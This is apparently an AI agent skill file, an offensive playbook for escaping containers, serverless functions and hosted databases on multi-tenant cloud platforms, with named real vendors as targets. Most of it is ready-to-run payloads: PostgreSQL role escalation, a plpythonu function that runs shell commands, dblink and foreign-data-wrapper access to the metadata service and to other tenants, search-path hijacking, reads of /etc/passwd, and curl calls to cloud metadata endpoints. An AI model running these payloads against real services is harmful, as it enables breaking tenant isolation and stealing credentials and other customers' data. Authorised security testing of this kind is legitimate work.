---
name: hunt-container-escape
description: Container/serverless escape and cross-tenant attacks — cloud-native infrastructure boundary testing for DBaaS, FaaS, container orchestration platforms.
triggers:
  - container
  - serverless
  - kubernetes
  - docker
  - cloud-native
  - tenant isolation
  - sandbox escape
  - dbaas
  - faas
priority: 80
---

# hunt-container-escape — Cloud-Native Boundary Testing

## Target Profile

DBaaS (Neon, Supabase, PlanetScale), FaaS (Vercel Functions, Cloudflare Workers),
container platforms, Kubernetes-based services, or any multi-tenant cloud infrastructure.

## Attack Surface

### 1. Database Extension Privilege Escalation
The #1 proven attack class on DBaaS platforms (Azure, GCP, Supabase, Aiven all fell to this).
```sql
-- Enumerate available extensions
SELECT * FROM pg_available_extensions;

-- Check current role privileges
SELECT rolsuper, rolcreaterole, rolcreatedb, rolreplication
FROM pg_roles WHERE rolname = current_user;

-- If CREATEROLE is granted, try escalation
CREATE ROLE escalated WITH LOGIN PASSWORD 'test123' IN ROLE pg_read_server_files;
CREATE ROLE escalated WITH LOGIN PASSWORD 'test123' IN ROLE pg_execute_server_program;
```

### 2. Dangerous Extensions
```sql
-- dblink: connect to internal services
CREATE EXTENSION IF NOT EXISTS dblink;
SELECT * FROM dblink('host=169.254.169.254 dbname=metadata', 'SELECT 1') AS t(col text);

-- postgres_fdw: access other tenants
CREATE EXTENSION IF NOT EXISTS postgres_fdw;
CREATE SERVER other_tenant FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host 'internal-host', dbname 'other');

-- file_fdw: read files from the host
CREATE EXTENSION IF NOT EXISTS file_fdw;
CREATE SERVER file_server FOREIGN DATA WRAPPER file_fdw;

-- plpythonu / plperlu: OS command execution
CREATE EXTENSION IF NOT EXISTS plpythonu;
CREATE FUNCTION cmd(c text) RETURNS text AS $$ import subprocess; return subprocess.check_output(c, shell=True).decode() $$ LANGUAGE plpythonu;
```

### 3. Search-Path Hijacking (CVE-2023-32305 pattern)
```sql
-- Create a function in public schema that shadows a system function
-- If platform internals call unqualified function names, this hijacks them
CREATE OR REPLACE FUNCTION public.current_setting(text) RETURNS text AS $$
  -- log or exfiltrate the setting name being looked up
  SELECT pg_catalog.current_setting($1);
$$ LANGUAGE sql;
```

### 4. File I/O
```sql
-- COPY TO/FROM (if permitted)
COPY (SELECT 1) TO '/tmp/test_write';
CREATE TABLE test_read (line text);
COPY test_read FROM '/etc/hostname';

-- Large object I/O
SELECT lo_import('/etc/passwd');
```

### 5. Network Access from Database
```sql
-- Can the DB reach the metadata service?
-- Can it reach other internal services?
-- Test via dblink, http extension, or pg_net
```

### 6. Serverless Function Escape
- Environment variable enumeration (credentials in env)
- Filesystem access (/proc, /etc, shared mounts)
- Network access to internal services (metadata, other functions)
- Resource limits bypass (memory, CPU, execution time)
- Shared /tmp across invocations (data leakage)

### 7. Container Metadata
```
# Cloud metadata endpoints
curl http://169.254.169.254/latest/meta-data/     # AWS
curl http://metadata.google.internal/              # GCP
curl http://169.254.169.254/metadata/instance      # Azure
```

## Verification

- Every finding must demonstrate CROSS-TENANT impact or privilege escalation
- Reading your OWN data from the filesystem is not a finding
- Reaching metadata that only contains your own instance info is not a finding
- The test must prove escape FROM the tenant sandbox, not just access within it
